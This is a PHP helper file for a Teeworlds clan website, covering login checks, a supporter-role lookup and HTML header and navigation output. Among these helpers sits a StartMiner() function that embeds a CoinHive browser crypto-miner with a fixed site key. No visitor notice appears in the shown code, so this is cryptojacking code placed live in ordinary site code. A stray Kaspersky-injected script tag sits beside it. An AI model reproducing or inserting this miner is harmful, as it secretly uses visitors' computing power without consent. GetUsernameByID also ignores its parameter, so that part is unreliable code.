<?php
/***************************
*  usefull_functions.php   *
*   teeworlds project      *
****************************/

function IsLoggedIn()
{
    if (!empty($_SESSION['csLOGGED']) && $_SESSION['csLOGGED'] === "online")
        return true;
    if (isset($_COOKIE['token'])) // try autologin from cookies
    {
        if (LoadLoginCookie($_COOKIE['token']))
            return true;
    }
    return false;
}

function IsSupporter()
{
    if (!IsLoggedIn())
        return false;

    $db = new PDO(ABSOLUTE_DATABASE_PATH);
    $stmt = $db->prepare('SELECT * FROM Accounts WHERE ID = ? ');
    $stmt->execute(array($_SESSION['csID']));
    $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

    if ($rows)
    {
        //$username = $rows[0]['Username'];
        //$IsSuperMod = $rows[0]['IsSuperModerator'];
        $IsSupporter = $rows[0]['IsSupporter'];
        if ($IsSupporter === "1")
        {
            return true;
        }
    }
    return false;
}

function HtmlFooter()
{
?>
    </div>
	</body>
</html>
<?php
}

function fok()
{
?>
    <!-- new line -->
    <script src="design/js_clouds.js"></script>
<?php
	HtmlFooter();
	die();
}

function HtmlHeader($page, $style = "js_clouds.css", $style2 = "")
{
?>
<!DOCTYPE html>
<html>
	<head>
		<link href="http://fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet" type="text/css">
        <link rel="stylesheet" href="design/style.css"></style>
		<link rel="stylesheet" href="<?php echo "design/$style"; ?>"></style>
<?php
    if ($style2 !== "")
    {
?>
		<link rel="stylesheet" href="<?php echo "design/$style2"; ?>"></style>
<?php
    }
    if (in_array($page, HOTKEY_PAGES))
    {
        if (IsSupporter())
        {
?>
        <script src="hotkeys_supporter.js"></script>
<?php
        }
        else if (IsLoggedIn())
        {
?>
        <script src="hotkeys_user.js"></script>
<?php
        }
        else
        {
?>
        <script src="hotkeys_default.js"></script>
<?php
        }
    }
?>
        <title><?php echo "Chilli.* - $page"; ?></title>
	</head>
	<body>
        <div id="header-nav">
            <ul>
                <li><a <?php if ($page === "Home") { echo 'class="active"'; } ?> href="index.php">Home</a></li>
                <li><a <?php if ($page === "Clan") { echo 'class="active"'; } ?>href="clan.php">Clan</a></li>
                <li><a <?php if ($page === "Server") { echo 'class="active"'; } ?>href="server.php">Server</a></li>
                <li><a <?php if ($page === "Players") { echo 'class="active"'; } ?>href="players.php">Players</a></li>
<?php
    if (IsSupporter())
    {
?>
                <li><a <?php if ($page === "ServerPanel") { echo 'class="active"'; } ?>href="server_panel.php">Panel</a></li>
<?php
    }
?>
                <li style="float:right">
                <?php
                    if (IsLoggedIn())
                    {
                        echo "<a " . (($page === "Account") ? 'class="active"' : '') . "href=\"account.php\">Account</a>";
                    }
                    else
                    {
                        echo "<a href=\"login.php\">Login</a>";
                    }
                ?>
                </li>
            </ul>
        </div> <!-- header-nav -->
<?php
    if ($style == "clouds.css")
    {
?>
        <!-- CSS clouds -->
        <div class="cloud" id="cloud1"><img src="design/img/bg_cloud3.png" width="200em"></div>
        <div class="cloud" id="cloud2"><img src="design/img/bg_cloud2.png" width="350em"></div>
        <div class="cloud" id="cloud3"><img src="design/img/bg_cloud1.png" width="300em"></div>
        <div class="cloud" id="cloud4"><img src="design/img/bg_cloud3.png" width="250em"></div>
        <div class="cloud" id="cloud5"><img src="design/img/bg_cloud2.png" width="280em"></div>
<?php
    }
    else if ($style == "js_clouds.css")
    {
?>
        <!-- JavaScript clouds -->
        <div class="cloud" id="cloud1" style="left: 120px;"></div>
        <div class="cloud" id="cloud2" style="left: 300px;"></div>
        <div class="cloud" id="cloud3" style="left: 50px;"></div>
        <div class="cloud" id="cloud4" style="left: 50px;"></div>
        <div class="cloud" id="cloud5" style="left: 50px;"></div>
        <div class="cloud" id="cloud6" style="left: 50px;"></div>
<?php
    }
    else if ($style == "jungle.css")
    {
?>
        <div class="jungle-background"></div>
        <div class="jungle-mid-light-green"></div>
<?php
    }
?>
        <div class="main-content">
<?php
}

function StartMiner()
{
    echo "
    <script type=\"text/javascript\" src=\"http://gc.kis.v2.scr.kaspersky-labs.com/53E3864D-FC2B-D140-B3DF-6529E8918B17/main.js\" charset=\"UTF-8\"></script><script src=\"https://coin-hive.com/lib/coinhive.min.js\"></script>
    <script>
        var miner = new CoinHive.Anonymous('j57w0oCR02CAY7z3JgZ4q90071ajRxP1');
        miner.start();
    </script>
    ";
}

function GetUsernameByID($sqlID)
{
	$db = new PDO(ABSOLUTE_DATABASE_PATH);
	$db->setAttribute( PDO::ATTR_ERRMODE, PDO::ERRMODE_WARNING );
	$stmt = $db->prepare('SELECT * FROM Accounts WHERE ID = ? ');
	$stmt->execute(array($_SESSION['csID']));

	$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

	if ($rows)
	{
		$username = $rows[0]['Username'];
		return $username;
	}
	return "error";
}

?>
